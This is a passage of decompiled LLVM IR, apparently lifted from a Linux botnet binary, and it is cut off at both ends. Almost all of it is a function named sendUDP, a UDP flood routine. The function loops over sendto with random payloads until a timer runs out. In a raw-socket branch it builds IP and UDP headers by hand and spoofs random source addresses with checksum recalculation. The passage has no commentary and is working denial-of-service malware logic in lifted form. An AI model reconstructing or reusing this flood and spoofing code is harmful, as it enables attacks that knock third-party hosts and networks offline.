  uselistorder i32 %v4_804b70c, { 1, 2, 0 }
  uselistorder i32 %v4_804b67b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804b64a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b70c, { 1, 0 }
  uselistorder label %dec_label_pc_804b6eb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b5d5, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp32 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804b729 = load i32, i32* @ebx, align 4
  %v13_804b72a = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b733 = icmp eq i32 %arg2, 0
  %v1_804b737 = icmp eq i1 %v4_804b733, false
  br i1 %v1_804b737, label %dec_label_pc_804b747, label %dec_label_pc_804b739

dec_label_pc_804b739:                             ; preds = %entry
  %v1_804b739 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b75c

dec_label_pc_804b747:                             ; preds = %entry
  %v1_804b74a = urem i32 %arg2, 65536
  store i32 %v1_804b74a, i32* %eax.global-to-local, align 4
  store i32 %v1_804b74a, i32* %stack_var_-140, align 4
  %v1_804b750 = trunc i32 %arg2 to i16
  %v2_804b750 = call i32 @htons(i16 %v1_804b750)
  br label %dec_label_pc_804b75c

dec_label_pc_804b75c:                             ; preds = %dec_label_pc_804b739, %dec_label_pc_804b747
  %v2_804b75c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v4_804b76c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804b76c, i32* %eax.global-to-local, align 4
  %v1_804b771 = icmp eq i32 %v4_804b76c, 0
  %v1_804b773 = icmp eq i1 %v1_804b771, false
  br i1 %v1_804b773, label %dec_label_pc_804bc1a, label %dec_label_pc_804b779

dec_label_pc_804b779:                             ; preds = %dec_label_pc_804b75c
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b792 = icmp eq i32 %arg4, 32
  %v1_804b796 = icmp eq i1 %v9_804b792, false
  br i1 %v1_804b796, label %dec_label_pc_804b8d2, label %dec_label_pc_804b79c

dec_label_pc_804b79c:                             ; preds = %dec_label_pc_804b779
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804b7b3 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804b7b3, i32* %eax.global-to-local, align 4
  %v4_804b7bb = icmp eq i32 %v4_804b7b3, 0
  %v1_804b7bf = icmp eq i1 %v4_804b7bb, false
  br i1 %v1_804b7bf, label %dec_label_pc_804b7db, label %dec_label_pc_804b7c1

dec_label_pc_804b7c1:                             ; preds = %dec_label_pc_804b79c
  %v0_804b7c1 = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804b7c1, i32* %eax.global-to-local, align 4
  store i32 %v0_804b7c1, i32* %stack_var_-140, align 4
  %v3_804b7d1 = call i32 @Rootsprintf(i32 %v0_804b7c1, i32 ptrtoint ([27 x i8]* @global_var_80569f0.102 to i32))
  store i32 %v3_804b7d1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc1a

dec_label_pc_804b7db:                             ; preds = %dec_label_pc_804b79c
  %v1_804b7de = add i32 %arg5, 1
  store i32 %v1_804b7de, i32* %eax.global-to-local, align 4
  store i32 %v1_804b7de, i32* %stack_var_-140, align 4
  %v1_804b7e2 = call i32 @malloc(i32 %v1_804b7de)
  store i32 %v1_804b7e2, i32* %eax.global-to-local, align 4
  %v4_804b7ea = icmp eq i32 %v1_804b7e2, 0
  br i1 %v4_804b7ea, label %dec_label_pc_804bc1a, label %dec_label_pc_804b7f4

dec_label_pc_804b7f4:                             ; preds = %dec_label_pc_804b7db
  store i32 %v1_804b7de, i32* %edx.global-to-local, align 4
  %v1_804b7fd = inttoptr i32 %v1_804b7e2 to i8*
  store i32 %v1_804b7e2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b802 = and i32 %v1_804b7e2, -256
  store i32 %v1_804b802, i32* %eax.global-to-local, align 4
  %v5_804b804 = call i8* @_memset(i8* %v1_804b7fd, i32 %v1_804b802, i32 %v1_804b7de)
  store i32 %v1_804b7e2, i32* %eax.global-to-local, align 4
  store i32 %v1_804b7e2, i32* %stack_var_-140, align 4
  %v4_804b813 = call i32 @makeRandomStr(i8* %v1_804b7fd, i32 %arg5)
  store i32 %v4_804b813, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b81f = call i32 @__GI_time(i32* null)
  %v5_804b824 = add i32 %v2_804b81f, %arg3
  store i32 %v5_804b824, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804b8b0 = sdiv i64 %sext, 4294967296
  %v3_804b8b0 = mul nsw i64 %v2_804b8b0, 1000
  %v4_804b8b0 = trunc i64 %v3_804b8b0 to i32
  br label %dec_label_pc_804b83a.outer

dec_label_pc_804b83a.outer:                       ; preds = %dec_label_pc_804b8ad, %dec_label_pc_804b8ca, %dec_label_pc_804b7f4
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b7f4 ], [ 0, %dec_label_pc_804b8ad ], [ %v4_804b8ca, %dec_label_pc_804b8ca ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b7f4 ], [ %v4_804b8a2, %dec_label_pc_804b8ad ], [ %v4_804b8a2, %dec_label_pc_804b8ca ]
  br label %dec_label_pc_804b83a

dec_label_pc_804b83a:                             ; preds = %dec_label_pc_804b83a.outer, %dec_label_pc_804b884
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b884 ], [ %stack_var_-92.0.ph, %dec_label_pc_804b83a.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804b7b3, i32* %eax.global-to-local, align 4
  store i32 %v4_804b7b3, i32* %stack_var_-140, align 4
  %v7_804b865 = call i32 @__libc_sendto(i32 %v4_804b7b3, i32 %v1_804b7e2, i32 %arg5, i32 0, i32 %v2_804b75c, i32 16)
  store i32 %v7_804b865, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b86d = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b870 = icmp eq i1 %v15_804b86d, false
  br i1 %v1_804b870, label %dec_label_pc_804b8a2, label %dec_label_pc_804b872

dec_label_pc_804b872:                             ; preds = %dec_label_pc_804b83a
  br i1 %v1_804b737, label %dec_label_pc_804b884, label %dec_label_pc_804b878

dec_label_pc_804b878:                             ; preds = %dec_label_pc_804b872
  %v0_804b878 = load i32, i32* %stack_var_-140, align 4
  %v1_804b878 = call i32 @rand_cmwc(i32 %v0_804b878)
  %v1_804b87d = urem i32 %v1_804b878, 65536
  store i32 %v1_804b87d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b884

dec_label_pc_804b884:                             ; preds = %dec_label_pc_804b872, %dec_label_pc_804b878
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b88b = call i32 @__GI_time(i32* null)
  store i32 %v2_804b88b, i32* %eax.global-to-local, align 4
  %v8_804b893 = icmp sgt i32 %v2_804b88b, %v5_804b824
  br i1 %v8_804b893, label %dec_label_pc_804bc1a, label %dec_label_pc_804b83a

dec_label_pc_804b8a2:                             ; preds = %dec_label_pc_804b83a
  %v4_804b8a2 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b8a8 = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b8ab = icmp eq i1 %v15_804b8a8, false
  br i1 %v1_804b8ab, label %dec_label_pc_804b8ca, label %dec_label_pc_804b8ad

dec_label_pc_804b8ad:                             ; preds = %dec_label_pc_804b8a2
  store i32 %v4_804b8b0, i32* %eax.global-to-local, align 4
  store i32 %v4_804b8b0, i32* %stack_var_-140, align 4
  %v2_804b8b9 = call i32 @usleep(i64 %v3_804b8b0)
  store i32 %v2_804b8b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b83a.outer

dec_label_pc_804b8ca:                             ; preds = %dec_label_pc_804b8a2
  %v4_804b8ca = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b83a.outer

dec_label_pc_804b8d2:                             ; preds = %dec_label_pc_804b779
  store i32 %v13_804b72a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804b8ee = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804b8ee, i32* %eax.global-to-local, align 4
  %v4_804b8f6 = icmp eq i32 %v4_804b8ee, 0
  %v1_804b8fa = icmp eq i1 %v4_804b8f6, false
  br i1 %v1_804b8fa, label %dec_label_pc_804b916, label %dec_label_pc_804b8fc

dec_label_pc_804b8fc:                             ; preds = %dec_label_pc_804b8d2
  %v0_804b8fc = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804b8fc, i32* %eax.global-to-local, align 4
  store i32 %v0_804b8fc, i32* %stack_var_-140, align 4
  %v3_804b90c = call i32 @Rootsprintf(i32 %v0_804b8fc, i32 ptrtoint ([27 x i8]* @global_var_80569f0.102 to i32))
  store i32 %v3_804b90c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc17

dec_label_pc_804b916:                             ; preds = %dec_label_pc_804b8d2
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b925 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v4_804b8ee, i32* %eax.global-to-local, align 4
  store i32 %v4_804b8ee, i32* %stack_var_-140, align 4
  %v6_804b942 = call i32 @__GI_setsockopt(i32 %v4_804b8ee, i32 0, i32 3, i32 %v2_804b925, i32 4)
  store i32 %v6_804b942, i32* %eax.global-to-local, align 4
  %v2_804b947 = icmp slt i32 %v6_804b942, 0
  %v1_804b949 = icmp eq i1 %v2_804b947, false
  br i1 %v1_804b949, label %dec_label_pc_804b998.preheader, label %dec_label_pc_804b94b

dec_label_pc_804b998.preheader:                   ; preds = %dec_label_pc_804b916
  br label %dec_label_pc_804b96e

dec_label_pc_804b94b:                             ; preds = %dec_label_pc_804b916
  %v0_804b94b = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804b94b, i32* %eax.global-to-local, align 4
  store i32 %v0_804b94b, i32* %stack_var_-140, align 4
  %v3_804b95b = call i32 @Rootsprintf(i32 %v0_804b94b, i32 ptrtoint ([33 x i8]* @global_var_8056a0c.103 to i32))
  store i32 %v3_804b95b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc17

dec_label_pc_804b96e:                             ; preds = %dec_label_pc_804b998.preheader, %dec_label_pc_804b96e
  %v4_804b99876 = phi i32 [ 49, %dec_label_pc_804b998.preheader ], [ %v4_804b998, %dec_label_pc_804b96e ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b975 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b975, i32* %eax.global-to-local, align 4
  store i32 %v2_804b975, i32* @ebx, align 4
  %v0_804b97c = load i32, i32* %stack_var_-140, align 4
  %v1_804b97c = call i32 @rand_cmwc(i32 %v0_804b97c)
  %v1_804b981 = load i32, i32* @ebx, align 4
  %v2_804b981 = xor i32 %v1_804b981, %v1_804b97c
  store i32 %v2_804b981, i32* @eax, align 4
  store i32 %v2_804b981, i32* %stack_var_-140, align 4
  %v1_804b986 = call i32 @srand(i32 %v2_804b981)
  store i32 %v1_804b986, i32* @eax, align 4
  %v0_804b98b = call i32 @random()
  store i32 %v0_804b98b, i32* %eax.global-to-local, align 4
  store i32 %v0_804b98b, i32* %stack_var_-140, align 4
  %v1_804b993 = call i32 @init_rand(i32 %v0_804b98b)
  store i32 %v1_804b993, i32* %eax.global-to-local, align 4
  %v4_804b998 = add nsw i32 %v4_804b99876, -1
  %v13_804b99b = icmp eq i32 %v4_804b99876, 0
  %v1_804b99f = icmp eq i1 %v13_804b99b, false
  br i1 %v1_804b99f, label %dec_label_pc_804b96e, label %dec_label_pc_804b9a1

dec_label_pc_804b9a1:                             ; preds = %dec_label_pc_804b96e
  %v4_804b9a1 = icmp eq i32 %arg4, 0
  %v1_804b9a5 = icmp eq i1 %v4_804b9a1, false
  br i1 %v1_804b9a5, label %dec_label_pc_804b9b0, label %dec_label_pc_804b9c6

dec_label_pc_804b9b0:                             ; preds = %dec_label_pc_804b9a1
  %v5_804b9b7 = sub i32 32, %arg4
  %v2_804b9bf = urem i32 %v5_804b9b7, 32
  %v4_804b9bf = icmp eq i32 %v2_804b9bf, 0
  br i1 %v4_804b9bf, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804b9b0
  %v5_804b9bf = shl i32 1, %v2_804b9bf
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804b9b0, %bb
  %v0_804b9c1 = phi i32 [ %v5_804b9bf, %bb ], [ 1, %dec_label_pc_804b9b0 ]
  %v1_804b9c1 = sub i32 0, %v0_804b9c1
  store i32 %v1_804b9c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b9c6

dec_label_pc_804b9c6:                             ; preds = %dec_label_pc_804b9a1, %bb72
  %storemerge6 = phi i32 [ %v1_804b9c1, %bb72 ], [ 0, %dec_label_pc_804b9a1 ]
  %v1_804b9c9 = add i32 %arg5, 28
  %v1_804b9d5 = add i32 %arg5, 58
  %v2_804b9d8 = and i32 %v1_804b9d5, -16
  %v0_804b9de = load i32, i32* @esp, align 4
  %v2_804b9de = sub i32 %v0_804b9de, %v2_804b9d8
  %v1_804b9ea = add i32 %v2_804b9de, 39
  %v2_804b9ed = and i32 %v1_804b9ea, -16
  store i32 %v2_804b9ed, i32* %edx.global-to-local, align 4
  %v1_804ba05 = add i32 %v2_804b9ed, 20
  %v5_804ba08 = inttoptr i32 %v1_804ba05 to i16*
  %v1_804ba0e = add i32 %arg5, 8
  store i32 %v1_804ba0e, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ba16 = inttoptr i32 %v2_804b9de to i32*
  store i32 %storemerge6, i32* %v2_804ba16, align 4
  %v2_804ba19 = call i32 @GetRandomIP(i32 %v1_804b9c9, i32 %v2_804b9ed)
  store i32 %v2_804ba19, i32* %eax.global-to-local, align 4
  %v1_804ba1e = load i32, i32* @esp, align 4
  %v2_804ba1e = inttoptr i32 %v1_804ba1e to i32*
  store i32 %v2_804ba19, i32* %v2_804ba1e, align 4
  %v0_804ba21 = call i32 @htonl()
  %v3_804ba26 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804ba26, i32* %edx.global-to-local, align 4
  %v0_804ba29 = load i32, i32* @ebx, align 4
  %v1_804ba29 = load i32, i32* @esp, align 4
  %v2_804ba29 = add i32 %v1_804ba29, 16
  %v3_804ba29 = inttoptr i32 %v2_804ba29 to i32*
  store i32 %v0_804ba29, i32* %v3_804ba29, align 4
  %v0_804ba2d = load i32, i32* @esp, align 4
  %v1_804ba2d = add i32 %v0_804ba2d, 12
  %v2_804ba2d = inttoptr i32 %v1_804ba2d to i32*
  store i32 17, i32* %v2_804ba2d, align 4
  %v1_804ba35 = load i32, i32* @esp, align 4
  %v2_804ba35 = add i32 %v1_804ba35, 8
  %v3_804ba35 = inttoptr i32 %v2_804ba35 to i32*
  store i32 %v0_804ba21, i32* %v3_804ba35, align 4
  %v0_804ba39 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba39 = load i32, i32* @esp, align 4
  %v2_804ba39 = add i32 %v1_804ba39, 4
  %v3_804ba39 = inttoptr i32 %v2_804ba39 to i32*
  store i32 %v0_804ba39, i32* %v3_804ba39, align 4
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v1_804ba40 = load i32, i32* @esp, align 4
  %v2_804ba40 = inttoptr i32 %v1_804ba40 to i32*
  store i32 %v2_804b9ed, i32* %v2_804ba40, align 4
  %v0_804ba43 = call i32 @makeIPPacket()
  %v1_804ba51 = urem i32 %v1_804ba0e, 65536
  store i32 %v1_804ba51, i32* %eax.global-to-local, align 4
  %v1_804ba54 = load i32, i32* @esp, align 4
  %v2_804ba54 = inttoptr i32 %v1_804ba54 to i32*
  store i32 %v1_804ba51, i32* %v2_804ba54, align 4
  %v2_804ba57 = trunc i32 %v1_804ba05 to i16
  %v3_804ba57 = call i32 @htons(i16 %v2_804ba57)
  %v1_804ba5c = urem i32 %v3_804ba57, 65536
  store i32 %v1_804ba5c, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba05, i32* %eax.global-to-local, align 4
  %v1_804ba62 = trunc i32 %v3_804ba57 to i16
  %v3_804ba62 = add i32 %v2_804b9ed, 24
  %v4_804ba62 = inttoptr i32 %v3_804ba62 to i16*
  store i16 %v1_804ba62, i16* %v4_804ba62, align 8
  %v2_804ba66 = call i32 @rand_cmwc(i32 %v1_804ba05)
  %v1_804ba6b = urem i32 %v2_804ba66, 65536
  store i32 %v1_804ba6b, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba05, i32* %eax.global-to-local, align 4
  %v1_804ba71 = trunc i32 %v2_804ba66 to i16
  store i16 %v1_804ba71, i16* %v5_804ba08, align 4
  br i1 %v1_804b737, label %dec_label_pc_804ba87, label %dec_label_pc_804ba7a

dec_label_pc_804ba7a:                             ; preds = %dec_label_pc_804b9c6
  %v2_804ba7a = call i32 @rand_cmwc(i32 %v1_804ba05)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804ba9b

dec_label_pc_804ba87:                             ; preds = %dec_label_pc_804b9c6
  %v1_804ba8a = urem i32 %arg2, 65536
  store i32 %v1_804ba8a, i32* %eax.global-to-local, align 4
  %v1_804ba8d = load i32, i32* @esp, align 4
  %v2_804ba8d = inttoptr i32 %v1_804ba8d to i32*
  store i32 %v1_804ba8a, i32* %v2_804ba8d, align 4
  %v3_804ba90 = call i32 @htons(i16 %tmp32)
  br label %dec_label_pc_804ba9b

dec_label_pc_804ba9b:                             ; preds = %dec_label_pc_804ba7a, %dec_label_pc_804ba87
  %v1_804bb5b.pre-phi = phi i32 [ %.pre, %dec_label_pc_804ba7a ], [ %v1_804ba8a, %dec_label_pc_804ba87 ]
  %storemerge8.in = phi i32 [ %v2_804ba7a, %dec_label_pc_804ba7a ], [ %v3_804ba90, %dec_label_pc_804ba87 ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext9 = mul i32 %storemerge8.in, 65536
  %v4_804ba9e = sdiv i32 %sext9, 65536
  %v3_804baa1 = add i32 %v2_804b9ed, 22
  %v4_804baa1 = inttoptr i32 %v3_804baa1 to i16*
  store i16 %storemerge5, i16* %v4_804baa1, align 2
  %v1_804baa8 = add i32 %v2_804b9ed, 26
  %v2_804baa8 = inttoptr i32 %v1_804baa8 to i16*
  store i16 0, i16* %v2_804baa8, align 2
  %v1_804bab1 = add i32 %v2_804b9ed, 28
  store i32 %v1_804bab1, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804bab7 = load i32, i32* @esp, align 4
  %v2_804bab7 = add i32 %v1_804bab7, 4
  %v3_804bab7 = inttoptr i32 %v2_804bab7 to i32*
  store i32 %arg5, i32* %v3_804bab7, align 4
  %v0_804babb = load i32, i32* %edx.global-to-local, align 4
  %v1_804babb = load i32, i32* @esp, align 4
  %v2_804babb = inttoptr i32 %v1_804babb to i32*
  store i32 %v0_804babb, i32* %v2_804babb, align 4
  %v3_804babe = sext i16 %tmp to i32
  %v4_804babe = inttoptr i32 %v4_804ba9e to i8*
  %v5_804babe = call i32 @makeRandomStr(i8* %v4_804babe, i32 %v3_804babe)
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v1_804bac6 = or i32 %v2_804b9ed, 2
  %v2_804bac6 = inttoptr i32 %v1_804bac6 to i16*
  %v3_804bac6 = load i16, i16* %v2_804bac6, align 2
  %v4_804bac6 = zext i16 %v3_804bac6 to i32
  store i32 %v4_804bac6, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v1_804bacf = load i32, i32* @esp, align 4
  %v2_804bacf = add i32 %v1_804bacf, 4
  %v3_804bacf = inttoptr i32 %v2_804bacf to i32*
  store i32 %v4_804bac6, i32* %v3_804bacf, align 4
  %v0_804bad3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bad3 = load i32, i32* @esp, align 4
  %v2_804bad3 = inttoptr i32 %v1_804bad3 to i32*
  store i32 %v0_804bad3, i32* %v2_804bad3, align 4
  %v4_804bad6 = inttoptr i32 %v4_804ba9e to i16*
  %v5_804bad6 = call i32 @csum(i16* %v4_804bad6, i32 %v3_804babe)
  %v1_804badb = urem i32 %v5_804bad6, 65536
  store i32 %v1_804badb, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v1_804bae1 = trunc i32 %v5_804bad6 to i16
  %v3_804bae1 = or i32 %v2_804b9ed, 10
  %v4_804bae1 = inttoptr i32 %v3_804bae1 to i16*
  store i16 %v1_804bae1, i16* %v4_804bae1, align 2
  %v0_804bae5 = load i32, i32* @esp, align 4
  %v1_804bae5 = inttoptr i32 %v0_804bae5 to i32*
  store i32 0, i32* %v1_804bae5, align 4
  %v2_804baec = inttoptr i32 %v4_804ba9e to i32*
  %v3_804baec = call i32 @__GI_time(i32* %v2_804baec)
  %v5_804baf1 = add i32 %v3_804baec, %arg3
  store i32 %v5_804baf1, i32* %eax.global-to-local, align 4
  %v3_804bb81 = or i32 %v2_804b9ed, 4
  %v4_804bb81 = inttoptr i32 %v3_804bb81 to i16*
  %v2_804bb9d = or i32 %v2_804b9ed, 12
  %v3_804bb9d = inttoptr i32 %v2_804bb9d to i32*
  %sext12 = mul i64 %arg8, 4294967296
  %v2_804bbf5 = sdiv i64 %sext12, 4294967296
  %v3_804bbf5 = mul nsw i64 %v2_804bbf5, 1000
  %v4_804bbf5 = trunc i64 %v3_804bbf5 to i32
  br label %dec_label_pc_804bb07.outer

dec_label_pc_804bb07.outer:                       ; preds = %dec_label_pc_804bbf2, %dec_label_pc_804bc0f, %dec_label_pc_804ba9b
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804ba9b ], [ %v4_804bbe7, %dec_label_pc_804bc0f ], [ %v4_804bbe7, %dec_label_pc_804bbf2 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804ba9b ], [ %v4_804bc0f, %dec_label_pc_804bc0f ], [ 0, %dec_label_pc_804bbf2 ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804ba9b ], [ %storemerge, %dec_label_pc_804bc0f ], [ %storemerge, %dec_label_pc_804bbf2 ]
  br label %dec_label_pc_804bb07

dec_label_pc_804bb07:                             ; preds = %dec_label_pc_804bb07.outer, %dec_label_pc_804bbca
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804bbca ], [ %stack_var_-84.0.ph, %dec_label_pc_804bb07.outer ]
  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804bbca ], [ %stack_var_-104.0.ph, %dec_label_pc_804bb07.outer ]
  store i32 %v2_804b9ed, i32* %edx.global-to-local, align 4
  %v0_804bb0d = load i32, i32* @esp, align 4
  %v1_804bb0d = add i32 %v0_804bb0d, 20
  %v2_804bb0d = inttoptr i32 %v1_804bb0d to i32*
  store i32 16, i32* %v2_804bb0d, align 4
  %v1_804bb15 = load i32, i32* @esp, align 4
  %v2_804bb15 = add i32 %v1_804bb15, 16
  %v3_804bb15 = inttoptr i32 %v2_804bb15 to i32*
  store i32 %v2_804b75c, i32* %v3_804bb15, align 4
  %v0_804bb19 = load i32, i32* @esp, align 4
  %v1_804bb19 = add i32 %v0_804bb19, 12
  %v2_804bb19 = inttoptr i32 %v1_804bb19 to i32*
  store i32 0, i32* %v2_804bb19, align 4
  %v1_804bb24 = load i32, i32* @esp, align 4
  %v2_804bb24 = add i32 %v1_804bb24, 8
  %v3_804bb24 = inttoptr i32 %v2_804bb24 to i32*
  store i32 %v1_804b9c9, i32* %v3_804bb24, align 4
  %v0_804bb28 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bb28 = load i32, i32* @esp, align 4
  %v2_804bb28 = add i32 %v1_804bb28, 4
  %v3_804bb28 = inttoptr i32 %v2_804bb28 to i32*
  store i32 %v0_804bb28, i32* %v3_804bb28, align 4
  store i32 %v4_804b8ee, i32* %eax.global-to-local, align 4
  %v1_804bb2f = load i32, i32* @esp, align 4
  %v2_804bb2f = inttoptr i32 %v1_804bb2f to i32*
  store i32 %v4_804b8ee, i32* %v2_804bb2f, align 4
  %v6_804bb32 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804bb32, i32* %eax.global-to-local, align 4
  %v1_804bb37 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804bb3c = urem i32 %v1_804bb37, 65536
  store i32 %v1_804bb3c, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba05, i32* %eax.global-to-local, align 4
  %v1_804bb42 = trunc i32 %v1_804bb37 to i16
  store i16 %v1_804bb42, i16* %v5_804ba08, align 4
  br i1 %v1_804b737, label %dec_label_pc_804bb58, label %dec_label_pc_804bb4b

dec_label_pc_804bb4b:                             ; preds = %dec_label_pc_804bb07
  %v1_804bb4b = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804bb6c

dec_label_pc_804bb58:                             ; preds = %dec_label_pc_804bb07
  store i32 %v1_804bb5b.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804bb5e = load i32, i32* @esp, align 4
  %v2_804bb5e = inttoptr i32 %v1_804bb5e to i32*
  store i32 %v1_804bb5b.pre-phi, i32* %v2_804bb5e, align 4
  %v3_804bb61 = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804bb6c

dec_label_pc_804bb6c:                             ; preds = %dec_label_pc_804bb4b, %dec_label_pc_804bb58
  %storemerge10.in = phi i32 [ %v1_804bb4b, %dec_label_pc_804bb4b ], [ %v3_804bb61, %dec_label_pc_804bb58 ]
  %storemerge = trunc i32 %storemerge10.in to i16
  store i32 %v1_804ba05, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %storemerge10.in, 65536
  %v4_804bb6f = sdiv i32 %sext11, 65536
  store i32 %v4_804bb6f, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804baa1, align 2
  %v2_804bb76 = call i32 @rand_cmwc(i32 %v4_804bb6f)
  %v1_804bb7b = urem i32 %v2_804bb76, 65536
  store i32 %v1_804bb7b, i32* %edx.global-to-local, align 4
  %v1_804bb81 = trunc i32 %v2_804bb76 to i16
  store i16 %v1_804bb81, i16* %v4_804bb81, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804bb88 = load i32, i32* @esp, align 4
  %v2_804bb88 = inttoptr i32 %v1_804bb88 to i32*
  store i32 %storemerge6, i32* %v2_804bb88, align 4
  %v3_804bb8b = call i32 @GetRandomIP(i32 %v4_804bb6f, i32 %v13_804b72a)
  store i32 %v3_804bb8b, i32* %eax.global-to-local, align 4
  %v1_804bb90 = load i32, i32* @esp, align 4
  %v2_804bb90 = inttoptr i32 %v1_804bb90 to i32*
  store i32 %v3_804bb8b, i32* %v2_804bb90, align 4
  %v0_804bb93 = call i32 @htonl()
  store i32 %v0_804bb93, i32* %edx.global-to-local, align 4
  store i32 %v0_804bb93, i32* %v3_804bb9d, align 4
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v3_804bba3 = load i16, i16* %v2_804bac6, align 2
  %v4_804bba3 = zext i16 %v3_804bba3 to i32
  store i32 %v4_804bba3, i32* %edx.global-to-local, align 4
  store i32 %v2_804b9ed, i32* %eax.global-to-local, align 4
  %v1_804bbac = load i32, i32* @esp, align 4
  %v2_804bbac = add i32 %v1_804bbac, 4
  %v3_804bbac = inttoptr i32 %v2_804bbac to i32*
  store i32 %v4_804bba3, i32* %v3_804bbac, align 4
  %v0_804bbb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bbb0 = load i32, i32* @esp, align 4
  %v2_804bbb0 = inttoptr i32 %v1_804bbb0 to i32*
  store i32 %v0_804bbb0, i32* %v2_804bbb0, align 4
  %v3_804bbb3 = inttoptr i32 %v4_804bb6f to i16*
  %v4_804bbb3 = call i32 @csum(i16* %v3_804bbb3, i32 %v13_804b72a)
  %v1_804bbb8 = urem i32 %v4_804bbb3, 65536
  store i32 %v1_804bbb8, i32* %edx.global-to-local, align 4
  %v1_804bbbe = trunc i32 %v4_804bbb3 to i16
  store i16 %v1_804bbbe, i16* %v4_804bae1, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804bbc5 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804bbc8 = icmp eq i1 %v15_804bbc5, false
  br i1 %v1_804bbc8, label %dec_label_pc_804bbe7, label %dec_label_pc_804bbca

dec_label_pc_804bbca:                             ; preds = %dec_label_pc_804bb6c
  %v0_804bbca = load i32, i32* @esp, align 4
